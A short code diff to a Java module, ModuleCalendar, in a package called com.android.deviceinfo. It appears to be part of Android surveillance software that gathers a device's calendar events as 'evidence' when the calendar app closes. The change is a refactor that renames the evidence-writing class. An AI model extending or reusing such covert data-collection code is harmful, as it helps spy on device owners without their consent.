@@ -17,7 +17,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.crypto.Digest;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.interfaces.Observer;
@@ -91,10 +91,10 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 	@Override
 	public int notification(ProcessInfo process) {
-		if (process.processInfo.processName.contains("android.calendar")) {
+		if (process.processInfo.contains("android.calendar")) {
 			if (process.status == ProcessStatus.STOP) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+					Check.log(TAG + " (notification), observing found: " + process.processInfo);
 				}
 				actualGo();
 			}
@@ -335,7 +335,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 	 */
 	private void saveEvidenceCalendar(long idEvent, byte[] packet) {
 		// calendar.put(idEvent, Encryption.CRC32(packet));
-		final EvidenceReference log = new EvidenceReference(EvidenceType.CALENDAR);
+		final EvidenceBuilder log = new EvidenceBuilder(EvidenceType.CALENDAR);
 		log.write(packet);
 		log.close();
 
